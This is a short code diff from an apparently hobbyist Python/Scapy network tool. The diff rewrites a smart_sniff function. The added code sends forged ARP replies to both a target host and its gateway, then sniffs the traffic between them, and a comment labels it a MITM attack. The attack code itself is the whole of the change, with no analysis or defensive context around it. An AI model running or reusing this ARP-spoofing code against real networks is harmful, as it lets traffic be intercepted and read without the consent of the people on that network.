@@ -47,14 +47,14 @@ def arp_scan(target_ip = '192.168.0.0/24'):
     return clients
 
 def smart_sniff(target_ip, gateway_ip):
-    def editPkg(pkg):
-        print('.', end='')
-        sys.stdout.flush()
-        pkg.psrc = src
-        pkg.pdst = dst
-        pkg.src = getmacbyip(src)
-        pkg.dst = getmacbyip(dst) 
-    sniff(prn=editPkg, filter="src " + src, stop_filter = lambda x: x)
+
+
+    send(nc.craft_arp_spoof(target_ip, gateway_ip), count=10, verbose=False)
+    send(nc.craft_arp_spoof(gateway_ip, target_ip), count=10, verbose=False)
+    sniff(filter="src " + target_ip, count =1)
+    sniff(filter="src " + gateway_ip, count =1)
+    print("on est la tu connais")
+
 
 
 # Sniff package and display them (MITM attack)
